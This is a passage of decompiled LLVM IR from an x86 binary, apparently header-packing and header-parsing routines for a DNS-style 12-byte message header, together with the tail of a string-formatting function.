  %stack_var_-120.0 = phi i8* [ getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805d431.418, i32 0, i32 0), %dec_label_pc_8056b8a ], [ %stack_var_-120.156, %dec_label_pc_8056b24 ], [ %stack_var_-120.156, %dec_label_pc_8056b28 ]
  %v0_8056b2818 = phi i32 [ %v2_8056b9d, %dec_label_pc_8056b8a ], [ %v0_8056b3257, %dec_label_pc_8056b24 ], [ %v1_8056b2b, %dec_label_pc_8056b28 ]
  %v0_8056b9f = load i32, i32* @esi, align 4
  %v1_8056b9f = add i32 %v0_8056b9f, 1
  %v0_8056ba9.pre = load i32, i32* @edi, align 4
  store i32 %v1_8056b9f, i32* @esi, align 4
  %v7_8056ba3 = icmp sgt i32 %v1_8056b9f, 7
  %v10_8056ba9 = icmp eq i32 %v0_8056ba9.pre, -1
  br i1 %v7_8056ba3, label %dec_label_pc_8056ba9, label %dec_label_pc_8056b14

dec_label_pc_8056ba9:                             ; preds = %dec_label_pc_8056b9f
  br i1 %v10_8056ba9, label %dec_label_pc_8056bba, label %dec_label_pc_8056bae

dec_label_pc_8056bae:                             ; preds = %dec_label_pc_8056ba9, %dec_label_pc_8056b7a
  %v0_8056bb6 = phi i32 [ %v0_8056b2818, %dec_label_pc_8056ba9 ], [ %v3_8056b86, %dec_label_pc_8056b7a ]
  %v0_8056bae = phi i32 [ %v0_8056ba9.pre, %dec_label_pc_8056ba9 ], [ %v0_8056bae.pre, %dec_label_pc_8056b7a ]
  %v1_8056bae = load i32, i32* @ebp, align 4
  %v2_8056bae = add i32 %v1_8056bae, %v0_8056bae
  store i32 %v2_8056bae, i32* %eax.global-to-local, align 4
  %v9_8056bb1 = icmp eq i32 %v2_8056bae, 8
  %v1_8056bb4 = icmp eq i1 %v9_8056bb1, false
  br i1 %v1_8056bb4, label %dec_label_pc_8056bba, label %dec_label_pc_8056bb6

dec_label_pc_8056bb6:                             ; preds = %dec_label_pc_8056bae
  %v1_8056bb6 = inttoptr i32 %v0_8056bb6 to i8*
  store i8 58, i8* %v1_8056bb6, align 1
  %v0_8056bb9 = load i32, i32* @ebx, align 4
  %v1_8056bb9 = add i32 %v0_8056bb9, 1
  store i32 %v1_8056bb9, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056bba

dec_label_pc_8056bba:                             ; preds = %dec_label_pc_8056bae, %dec_label_pc_8056ba9, %dec_label_pc_8056bb6
  %v0_8056bbe = phi i32 [ %v0_8056bb6, %dec_label_pc_8056bae ], [ %v0_8056b2818, %dec_label_pc_8056ba9 ], [ %v1_8056bb9, %dec_label_pc_8056bb6 ]
  store i32 %v2_8056b09, i32* %edx.global-to-local, align 4
  %v1_8056bbe = add i32 %v0_8056bbe, 1
  store i32 %v1_8056bbe, i32* %eax.global-to-local, align 4
  %v1_8056bc1 = inttoptr i32 %v0_8056bbe to i8*
  store i8 0, i8* %v1_8056bc1, align 1
  %v0_8056bc4 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056bc4 = load i32, i32* %edx.global-to-local, align 4
  %v2_8056bc4 = sub i32 %v0_8056bc4, %v1_8056bc4
  store i32 %v2_8056bc4, i32* @eax, align 4
  %tmp70 = icmp ugt i32 %v2_8056bc4, %arg4
  br i1 %tmp70, label %dec_label_pc_8056bcc, label %dec_label_pc_8056bd9

dec_label_pc_8056bcc:                             ; preds = %dec_label_pc_8056bba
  %v0_8056bcc = load i32, i32* %stack_var_-124, align 4
  %v1_8056bcc = call i32 @function_8050f90(i32 %v0_8056bcc)
  store i32 %v1_8056bcc, i32* %eax.global-to-local, align 4
  %v1_8056bd1 = inttoptr i32 %v1_8056bcc to i32*
  store i32 28, i32* %v1_8056bd1, align 4
  br label %dec_label_pc_8056bfa

dec_label_pc_8056bd9:                             ; preds = %dec_label_pc_8056bba
  %v0_8056bd9 = load i32, i32* @edi, align 4
  store i32 %v0_8056bd9, i32* %stack_var_-112, align 4
  store i32 %arg3, i32* %stack_var_-124, align 4
  %v3_8056be3 = inttoptr i32 %arg3 to i8*
  %v4_8056be3 = call i32 @function_8051edc(i8* %v3_8056be3, i32 %v2_8056b09)
  store i32 %v4_8056be3, i32* %eax.global-to-local, align 4
  store i32 %v4_8056be3, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8056bfc

dec_label_pc_8056bef:                             ; preds = %dec_label_pc_8056a45
  %v1_8056bef = call i32 @function_8050f90(i32 %v0_8056a38)
  store i32 %v1_8056bef, i32* %eax.global-to-local, align 4
  %v1_8056bf4 = inttoptr i32 %v1_8056bef to i32*
  store i32 97, i32* %v1_8056bf4, align 4
  br label %dec_label_pc_8056bfa

dec_label_pc_8056bfa:                             ; preds = %dec_label_pc_8056bcc, %dec_label_pc_8056bef
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8056bfc

dec_label_pc_8056bfc:                             ; preds = %dec_label_pc_8056b53, %dec_label_pc_8056bd9, %dec_label_pc_8056a50, %dec_label_pc_8056bfa
  %v0_8056bff = phi i32 [ 0, %dec_label_pc_8056b53 ], [ %v4_8056be3, %dec_label_pc_8056bd9 ], [ %v3_8056a5c, %dec_label_pc_8056a50 ], [ 0, %dec_label_pc_8056bfa ]
  store i32 %v0_8056bff, i32* %eax.global-to-local, align 4
  store i32 %v0_8056a38, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8056bff

; uselistorder directives
  uselistorder i32 %v0_8056bff, { 1, 0 }
  uselistorder i32 %v0_8056bbe, { 1, 0 }
  uselistorder i1 %v10_8056ba9, { 1, 0 }
  uselistorder i32 %v0_8056ba9.pre, { 1, 0, 2 }
  uselistorder i32 %v1_8056b9f, { 1, 0, 2 }
  uselistorder i32 %v1_8056b8b, { 1, 0 }
  uselistorder i32 %v0_8056b94, { 3, 2, 0, 1 }
  uselistorder i32 %v2_8056b20, { 1, 0 }
  uselistorder i32 %v2_8056b19, { 1, 2, 0 }
  uselistorder i32 %stack_var_-116.155, { 2, 1, 0 }
  uselistorder i8* %stack_var_-120.156, { 2, 1, 0 }
  uselistorder i32 %v0_8056b3257, { 3, 2, 1, 0 }
  uselistorder i32 %v1_8056b2458, { 2, 1, 0 }
  uselistorder i32 %v0_8056b2e59, { 2, 6, 5, 1, 4, 3, 0 }
  uselistorder i32 %v2_8056b09, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_8056ba917, { 1, 0 }
  uselistorder i32 %v1_8056afe, { 1, 0 }
  uselistorder i32 %v0_8056afe, { 1, 0, 2 }
  uselistorder i32 %v5_8056b06, { 1, 2, 0 }
  uselistorder i32 %v1_8056ae1, { 0, 2, 1 }
  uselistorder i32 %v0_8056ad18, { 1, 2, 0, 3 }
  uselistorder i32 %v0_8056adc12, { 1, 2, 0, 3 }
  uselistorder i1 %v10_8056acc, { 1, 0 }
  uselistorder i32 %v0_8056af761, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8056aec62, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_8056ae164, { 4, 1, 3, 2, 0 }
  uselistorder i32 %v0_8056a9965, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_8056a38, { 0, 2, 1 }
  uselistorder i32* %stack_var_-112, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-124, { 2, 1, 3, 4, 0, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 5, 6, 2, 4, 3, 7 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 14, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 97, { 5, 6, 4, 0, 3, 2, 1 }
  uselistorder [3 x i8]* @global_var_805d431.418, { 1, 0 }
  uselistorder i8 58, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32 64, { 8, 0, 3, 10, 7, 9, 6, 2, 4, 5, 1 }
  uselistorder i32* @esp, { 0, 1, 24, 5, 25, 26, 27, 28, 29, 30, 6, 168, 169, 170, 171, 172, 173, 174, 8, 175, 176, 177, 178, 179, 14, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 10, 190, 191, 192, 11, 193, 7, 194, 195, 196, 197, 198, 199, 12, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 9, 213, 214, 215, 216, 217, 218, 13, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 124, 15, 125, 240, 2, 3, 4, 16, 126, 127, 128, 129, 17, 130, 131, 132, 133, 20, 134, 135, 136, 21, 137, 22, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 19, 151, 23, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 18, 164, 165, 166, 167, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123 }
  uselistorder i32 15, { 1, 3, 7, 6, 2, 5, 4, 0 }
  uselistorder i32 60, { 5, 6, 8, 9, 1, 10, 4, 3, 2, 7, 0 }
  uselistorder i64 4294967296, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32 (i8*, i32, i32)* @function_8051e84, { 0, 10, 11, 12, 3, 14, 15, 7, 13, 4, 1, 2, 5, 6, 8, 9 }
  uselistorder i32 (i32, i32, i32)* @function_8056924, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8056bfc, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_8056bfa, { 1, 0 }
  uselistorder label %dec_label_pc_8056bba, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056b9f, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8056b36, { 1, 0 }
  uselistorder label %dec_label_pc_8056b2e, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8056b14, { 1, 0 }
  uselistorder label %dec_label_pc_8056b09, { 1, 0 }
  uselistorder label %dec_label_pc_8056af9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056af5, { 1, 0 }
  uselistorder label %dec_label_pc_8056ae1, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8056ade, { 1, 0 }
  uselistorder label %dec_label_pc_8056ab4, { 1, 0 }
}

define i32 @function_8056c08() local_unnamed_addr {
dec_label_pc_8056c08:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_4()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8056c0c = load i32, i32* @ebx, align 4
  store i32 %v0_8056c0c, i32* %stack_var_-8, align 4
  store i32 %tmp5, i32* %ebx.global-to-local, align 4
  %v4_8056c16 = ptrtoint i8* %tmp to i32
  store i32 %v4_8056c16, i32* %esi.global-to-local, align 4
  %v7_8056c1a = icmp sgt i32 %tmp6, 11
  br i1 %v7_8056c1a, label %dec_label_pc_8056c20, label %dec_label_pc_8056cb4

dec_label_pc_8056c20:                             ; preds = %dec_label_pc_8056c08
  %v1_8056c20 = add i32 %tmp5, 1
  %v2_8056c20 = inttoptr i32 %v1_8056c20 to i8*
  %v3_8056c20 = load i8, i8* %v2_8056c20, align 1
  store i8 %v3_8056c20, i8* %tmp, align 1
  %v0_8056c26 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056c26 = inttoptr i32 %v0_8056c26 to i32*
  %v2_8056c26 = load i32, i32* %v1_8056c26, align 4
  %v1_8056c28 = trunc i32 %v2_8056c26 to i8
  %v2_8056c28 = load i32, i32* %esi.global-to-local, align 4
  %v3_8056c28 = add i32 %v2_8056c28, 1
  %v4_8056c28 = inttoptr i32 %v3_8056c28 to i8*
  store i8 %v1_8056c28, i8* %v4_8056c28, align 1
  store i32 4, i32* %edx.global-to-local, align 4
  %v0_8056c4d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056c4d = add i32 %v0_8056c4d, 8
  %v2_8056c4d = inttoptr i32 %v1_8056c4d to i32*
  %v3_8056c4d = load i32, i32* %v2_8056c4d, align 4
  %v1_8056c50 = mul i32 %v3_8056c4d, 8
  %v2_8056c53 = and i32 %v1_8056c50, 120
  %v2_8056c56 = or i32 %v2_8056c53, 4
  store i32 %v2_8056c56, i32* %edx.global-to-local, align 4
  %v1_8056c58 = add i32 %v0_8056c4d, 20
  %v2_8056c58 = inttoptr i32 %v1_8056c58 to i32*
  %v3_8056c58 = load i32, i32* %v2_8056c58, align 4
  %v4_8056c58 = icmp eq i32 %v3_8056c58, 0
  %v1_8056c5c = icmp eq i1 %v4_8056c58, false
  %v2_8056c5c = zext i1 %v1_8056c5c to i32
  %v2_8056c5f = or i32 %v2_8056c5c, %v2_8056c56
  store i32 %v2_8056c5f, i32* %edx.global-to-local, align 4
  %v2_8056c61 = or i32 %v2_8056c5f, 130
  %v3_8056c61 = trunc i32 %v2_8056c61 to i8
  store i32 %v2_8056c61, i32* @ecx, align 4
  %v2_8056c63 = load i32, i32* %esi.global-to-local, align 4
  %v3_8056c63 = add i32 %v2_8056c63, 2
  %v4_8056c63 = inttoptr i32 %v3_8056c63 to i8*
  store i8 %v3_8056c61, i8* %v4_8056c63, align 1
  %v0_8056c66 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056c6a = add i32 %v0_8056c66, 28
  %v2_8056c6a = inttoptr i32 %v1_8056c6a to i8*
  %v3_8056c6a = load i8, i8* %v2_8056c6a, align 1
  %v5_8056c6a = load i32, i32* %edx.global-to-local, align 4
  %v2_8056c73 = urem i8 %v3_8056c6a, 16
  %v7_8056c73 = zext i8 %v2_8056c73 to i32
  %v9_8056c73 = and i32 %v5_8056c6a, -256
  %v10_8056c73 = or i32 %v9_8056c73, %v7_8056c73
  store i32 %v10_8056c73, i32* %edx.global-to-local, align 4
  %v2_8056c76 = or i8 %v2_8056c73, -128
  %v2_8056c78 = load i32, i32* %esi.global-to-local, align 4
  %v3_8056c78 = add i32 %v2_8056c78, 3
  %v4_8056c78 = inttoptr i32 %v3_8056c78 to i8*
  store i8 %v2_8056c76, i8* %v4_8056c78, align 1
  %v0_8056c7b = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056c7b = add i32 %v0_8056c7b, 33
  %v2_8056c7b = inttoptr i32 %v1_8056c7b to i8*
  %v3_8056c7b = load i8, i8* %v2_8056c7b, align 1
  %v2_8056c7f = load i32, i32* %esi.global-to-local, align 4
  %v3_8056c7f = add i32 %v2_8056c7f, 4
  %v4_8056c7f = inttoptr i32 %v3_8056c7f to i8*
  store i8 %v3_8056c7b, i8* %v4_8056c7f, align 1
  %v0_8056c82 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056c82 = add i32 %v0_8056c82, 32
  %v2_8056c82 = inttoptr i32 %v1_8056c82 to i32*
  %v3_8056c82 = load i32, i32* %v2_8056c82, align 4
  %v1_8056c85 = trunc i32 %v3_8056c82 to i8
  %v2_8056c85 = load i32, i32* %esi.global-to-local, align 4
  %v3_8056c85 = add i32 %v2_8056c85, 5
  %v4_8056c85 = inttoptr i32 %v3_8056c85 to i8*
  store i8 %v1_8056c85, i8* %v4_8056c85, align 1
  %v0_8056c88 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056c88 = add i32 %v0_8056c88, 37
  %v2_8056c88 = inttoptr i32 %v1_8056c88 to i8*
  %v3_8056c88 = load i8, i8* %v2_8056c88, align 1
  %v2_8056c8c = load i32, i32* %esi.global-to-local, align 4
  %v3_8056c8c = add i32 %v2_8056c8c, 6
  %v4_8056c8c = inttoptr i32 %v3_8056c8c to i8*
  store i8 %v3_8056c88, i8* %v4_8056c8c, align 1
  %v0_8056c8f = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056c8f = add i32 %v0_8056c8f, 36
  %v2_8056c8f = inttoptr i32 %v1_8056c8f to i32*
  %v3_8056c8f = load i32, i32* %v2_8056c8f, align 4
  %v1_8056c92 = trunc i32 %v3_8056c8f to i8
  %v2_8056c92 = load i32, i32* %esi.global-to-local, align 4
  %v3_8056c92 = add i32 %v2_8056c92, 7
  %v4_8056c92 = inttoptr i32 %v3_8056c92 to i8*
  store i8 %v1_8056c92, i8* %v4_8056c92, align 1
  %v0_8056c95 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056c95 = add i32 %v0_8056c95, 41
  %v2_8056c95 = inttoptr i32 %v1_8056c95 to i8*
  %v3_8056c95 = load i8, i8* %v2_8056c95, align 1
  %v2_8056c99 = load i32, i32* %esi.global-to-local, align 4
  %v3_8056c99 = add i32 %v2_8056c99, 8
  %v4_8056c99 = inttoptr i32 %v3_8056c99 to i8*
  store i8 %v3_8056c95, i8* %v4_8056c99, align 1
  %v0_8056c9c = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056c9c = add i32 %v0_8056c9c, 40
  %v2_8056c9c = inttoptr i32 %v1_8056c9c to i32*
  %v3_8056c9c = load i32, i32* %v2_8056c9c, align 4
  %v1_8056c9f = trunc i32 %v3_8056c9c to i8
  %v2_8056c9f = load i32, i32* %esi.global-to-local, align 4
  %v3_8056c9f = add i32 %v2_8056c9f, 9
  %v4_8056c9f = inttoptr i32 %v3_8056c9f to i8*
  store i8 %v1_8056c9f, i8* %v4_8056c9f, align 1
  %v0_8056ca2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056ca2 = add i32 %v0_8056ca2, 45
  %v2_8056ca2 = inttoptr i32 %v1_8056ca2 to i8*
  %v3_8056ca2 = load i8, i8* %v2_8056ca2, align 1
  %v2_8056ca6 = load i32, i32* %esi.global-to-local, align 4
  %v3_8056ca6 = add i32 %v2_8056ca6, 10
  %v4_8056ca6 = inttoptr i32 %v3_8056ca6 to i8*
  store i8 %v3_8056ca2, i8* %v4_8056ca6, align 1
  %v0_8056ca9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056ca9 = add i32 %v0_8056ca9, 44
  %v2_8056ca9 = inttoptr i32 %v1_8056ca9 to i32*
  %v3_8056ca9 = load i32, i32* %v2_8056ca9, align 4
  %v1_8056cac = trunc i32 %v3_8056ca9 to i8
  %v2_8056cac = load i32, i32* %esi.global-to-local, align 4
  %v3_8056cac = add i32 %v2_8056cac, 11
  %v4_8056cac = inttoptr i32 %v3_8056cac to i8*
  store i8 %v1_8056cac, i8* %v4_8056cac, align 1
  %v2_8056cb4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8056cb4

dec_label_pc_8056cb4:                             ; preds = %dec_label_pc_8056c08, %dec_label_pc_8056c20
  %v2_8056cb4 = phi i32 [ %v0_8056c0c, %dec_label_pc_8056c08 ], [ %v2_8056cb4.pre, %dec_label_pc_8056c20 ]
  %v0_8056cb6 = phi i32 [ -1, %dec_label_pc_8056c08 ], [ 12, %dec_label_pc_8056c20 ]
  store i32 %v2_8056cb4, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8056cb6

; uselistorder directives
  uselistorder i32 45, { 5, 2, 4, 1, 0, 3 }
  uselistorder i32 41, { 2, 1, 0 }
  uselistorder i32 37, { 3, 1, 2, 0 }
  uselistorder i32 33, { 3, 1, 2, 0 }
  uselistorder i32 130, { 1, 2, 0 }
  uselistorder i32 120, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_8056cb4, { 1, 0 }
}

define i32 @function_8056cb8() local_unnamed_addr {
dec_label_pc_8056cb8:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i8* @__decompiler_undefined_function_4()
  %stack_var_-4 = alloca i32, align 4
  %v0_8056cb8 = load i32, i32* @ebx, align 4
  store i32 %v0_8056cb8, i32* %stack_var_-4, align 4
  %v4_8056cb9 = ptrtoint i8* %tmp2 to i32
  store i32 %v4_8056cb9, i32* @ecx, align 4
  store i32 %tmp, i32* %ebx.global-to-local, align 4
  %v2_8056cc1 = load i8, i8* %tmp2, align 1
  %v3_8056cc1 = zext i8 %v2_8056cc1 to i32
  %v1_8056cc4 = add i32 %v4_8056cb9, 1
  %v2_8056cc4 = inttoptr i32 %v1_8056cc4 to i8*
  %v3_8056cc4 = load i8, i8* %v2_8056cc4, align 1
  %v4_8056cc4 = zext i8 %v3_8056cc4 to i32
  %v2_8056cc8 = mul nuw nsw i32 %v3_8056cc1, 256
  %v2_8056ccb = or i32 %v4_8056cc4, %v2_8056cc8
  %v2_8056ccd = inttoptr i32 %tmp to i32*
  store i32 %v2_8056ccb, i32* %v2_8056ccd, align 4
  %v0_8056ccf = load i32, i32* @ecx, align 4
  %v1_8056ccf = add i32 %v0_8056ccf, 2
  %v2_8056ccf = inttoptr i32 %v1_8056ccf to i8*
  %v3_8056ccf = load i8, i8* %v2_8056ccf, align 1
  %tmp6 = icmp slt i8 %v3_8056ccf, 0
  %v2_8056cd3 = zext i1 %tmp6 to i32
  %v1_8056cd6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056cd6 = add i32 %v1_8056cd6, 4
  %v3_8056cd6 = inttoptr i32 %v2_8056cd6 to i32*
  store i32 %v2_8056cd3, i32* %v3_8056cd6, align 4
  %v0_8056cd9 = load i32, i32* @ecx, align 4
  %v1_8056cd9 = add i32 %v0_8056cd9, 2
  %v2_8056cd9 = inttoptr i32 %v1_8056cd9 to i8*
  %v3_8056cd9 = load i8, i8* %v2_8056cd9, align 1
  %v3_8056cdc = udiv i8 %v3_8056cd9, 8
  %tmp7 = urem i8 %v3_8056cdc, 16
  %v1_8056cdf = zext i8 %tmp7 to i32
  %v1_8056ce2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056ce2 = add i32 %v1_8056ce2, 8
  %v3_8056ce2 = inttoptr i32 %v2_8056ce2 to i32*
  store i32 %v1_8056cdf, i32* %v3_8056ce2, align 4
  %v0_8056ce5 = load i32, i32* @ecx, align 4
  %v1_8056ce5 = add i32 %v0_8056ce5, 2
  %v2_8056ce5 = inttoptr i32 %v1_8056ce5 to i8*
  %v3_8056ce5 = load i8, i8* %v2_8056ce5, align 1
  %div = udiv i8 %v3_8056ce5, 4
  %tmp8 = urem i8 %div, 2
  %v1_8056cec = zext i8 %tmp8 to i32
  %v1_8056cef = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056cef = add i32 %v1_8056cef, 12
  %v3_8056cef = inttoptr i32 %v2_8056cef to i32*
  store i32 %v1_8056cec, i32* %v3_8056cef, align 4
  %v0_8056cf2 = load i32, i32* @ecx, align 4
  %v1_8056cf2 = add i32 %v0_8056cf2, 2
  %v2_8056cf2 = inttoptr i32 %v1_8056cf2 to i8*
  %v3_8056cf2 = load i8, i8* %v2_8056cf2, align 1
  %div5 = udiv i8 %v3_8056cf2, 2
  %tmp9 = urem i8 %div5, 2
  %v1_8056cf8 = zext i8 %tmp9 to i32
  %v1_8056cfb = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056cfb = add i32 %v1_8056cfb, 16
  %v3_8056cfb = inttoptr i32 %v2_8056cfb to i32*
  store i32 %v1_8056cf8, i32* %v3_8056cfb, align 4
  %v0_8056cfe = load i32, i32* @ecx, align 4
  %v1_8056cfe = add i32 %v0_8056cfe, 2
  %v2_8056cfe = inttoptr i32 %v1_8056cfe to i8*
  %v3_8056cfe = load i8, i8* %v2_8056cfe, align 1
  %tmp10 = urem i8 %v3_8056cfe, 2
  %v1_8056d02 = zext i8 %tmp10 to i32
  %v1_8056d05 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056d05 = add i32 %v1_8056d05, 20
  %v3_8056d05 = inttoptr i32 %v2_8056d05 to i32*
  store i32 %v1_8056d02, i32* %v3_8056d05, align 4
  %v0_8056d08 = load i32, i32* @ecx, align 4
  %v1_8056d08 = add i32 %v0_8056d08, 3
  %v2_8056d08 = inttoptr i32 %v1_8056d08 to i8*
  %v3_8056d08 = load i8, i8* %v2_8056d08, align 1
  %tmp11 = icmp slt i8 %v3_8056d08, 0
  %v2_8056d0c = zext i1 %tmp11 to i32
  %v1_8056d0f = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056d0f = add i32 %v1_8056d0f, 24
  %v3_8056d0f = inttoptr i32 %v2_8056d0f to i32*
  store i32 %v2_8056d0c, i32* %v3_8056d0f, align 4
  %v0_8056d12 = load i32, i32* @ecx, align 4
  %v1_8056d12 = add i32 %v0_8056d12, 3
  %v2_8056d12 = inttoptr i32 %v1_8056d12 to i8*
  %v3_8056d12 = load i8, i8* %v2_8056d12, align 1
  %tmp12 = urem i8 %v3_8056d12, 16
  %v1_8056d16 = zext i8 %tmp12 to i32
  %v1_8056d19 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056d19 = add i32 %v1_8056d19, 28
  %v3_8056d19 = inttoptr i32 %v2_8056d19 to i32*
  store i32 %v1_8056d16, i32* %v3_8056d19, align 4
  %v0_8056d1c = load i32, i32* @ecx, align 4
  %v1_8056d1c = add i32 %v0_8056d1c, 4
  %v2_8056d1c = inttoptr i32 %v1_8056d1c to i8*
  %v3_8056d1c = load i8, i8* %v2_8056d1c, align 1
  %v4_8056d1c = zext i8 %v3_8056d1c to i32
  %v1_8056d20 = add i32 %v0_8056d1c, 5
  %v2_8056d20 = inttoptr i32 %v1_8056d20 to i8*
  %v3_8056d20 = load i8, i8* %v2_8056d20, align 1
  %v4_8056d20 = zext i8 %v3_8056d20 to i32
  %v2_8056d24 = mul nuw nsw i32 %v4_8056d1c, 256
  %v2_8056d27 = or i32 %v4_8056d20, %v2_8056d24
  %v1_8056d29 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056d29 = add i32 %v1_8056d29, 32
  %v3_8056d29 = inttoptr i32 %v2_8056d29 to i32*
  store i32 %v2_8056d27, i32* %v3_8056d29, align 4
  %v0_8056d2c = load i32, i32* @ecx, align 4
  %v1_8056d2c = add i32 %v0_8056d2c, 6
  %v2_8056d2c = inttoptr i32 %v1_8056d2c to i8*
  %v3_8056d2c = load i8, i8* %v2_8056d2c, align 1
  %v4_8056d2c = zext i8 %v3_8056d2c to i32
  %v1_8056d30 = add i32 %v0_8056d2c, 7
  %v2_8056d30 = inttoptr i32 %v1_8056d30 to i8*
  %v3_8056d30 = load i8, i8* %v2_8056d30, align 1
  %v4_8056d30 = zext i8 %v3_8056d30 to i32
  %v2_8056d34 = mul nuw nsw i32 %v4_8056d2c, 256
  %v2_8056d37 = or i32 %v4_8056d30, %v2_8056d34
  %v1_8056d39 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056d39 = add i32 %v1_8056d39, 36
  %v3_8056d39 = inttoptr i32 %v2_8056d39 to i32*
  store i32 %v2_8056d37, i32* %v3_8056d39, align 4
  %v0_8056d3c = load i32, i32* @ecx, align 4
  %v1_8056d3c = add i32 %v0_8056d3c, 8
  %v2_8056d3c = inttoptr i32 %v1_8056d3c to i8*
  %v3_8056d3c = load i8, i8* %v2_8056d3c, align 1
  %v4_8056d3c = zext i8 %v3_8056d3c to i32
  %v1_8056d40 = add i32 %v0_8056d3c, 9
  %v2_8056d40 = inttoptr i32 %v1_8056d40 to i8*
  %v3_8056d40 = load i8, i8* %v2_8056d40, align 1
  %v4_8056d40 = zext i8 %v3_8056d40 to i32
  %v2_8056d44 = mul nuw nsw i32 %v4_8056d3c, 256
  %v2_8056d47 = or i32 %v4_8056d40, %v2_8056d44
  %v1_8056d49 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056d49 = add i32 %v1_8056d49, 40
  %v3_8056d49 = inttoptr i32 %v2_8056d49 to i32*
  store i32 %v2_8056d47, i32* %v3_8056d49, align 4
  %v0_8056d4c = load i32, i32* @ecx, align 4
  %v1_8056d4c = add i32 %v0_8056d4c, 10
  %v2_8056d4c = inttoptr i32 %v1_8056d4c to i8*
  %v3_8056d4c = load i8, i8* %v2_8056d4c, align 1
  %v4_8056d4c = zext i8 %v3_8056d4c to i32
  %v1_8056d50 = add i32 %v0_8056d4c, 11
  %v2_8056d50 = inttoptr i32 %v1_8056d50 to i8*
  %v3_8056d50 = load i8, i8* %v2_8056d50, align 1
  %v4_8056d50 = zext i8 %v3_8056d50 to i32
  %v2_8056d54 = mul nuw nsw i32 %v4_8056d4c, 256
  %v2_8056d57 = or i32 %v4_8056d50, %v2_8056d54
  %v1_8056d59 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056d59 = add i32 %v1_8056d59, 44
  %v3_8056d59 = inttoptr i32 %v2_8056d59 to i32*
  store i32 %v2_8056d57, i32* %v3_8056d59, align 4
  %v2_8056d61 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8056d61, i32* @ebx, align 4
  ret i32 12

; uselistorder directives
  uselistorder i8* %tmp2, { 1, 0 }
  uselistorder i32 11, { 12, 13, 3, 4, 6, 14, 7, 8, 9, 10, 5, 11, 2, 1, 0 }
  uselistorder i32 7, { 13, 14, 2, 5, 3, 1, 6, 8, 9, 10, 11, 12, 4, 7, 0 }
  uselistorder i32 6, { 20, 21, 0, 1, 8, 18, 4, 13, 9, 10, 7, 22, 19, 5, 6, 3, 14, 15, 16, 17, 2, 11, 12 }
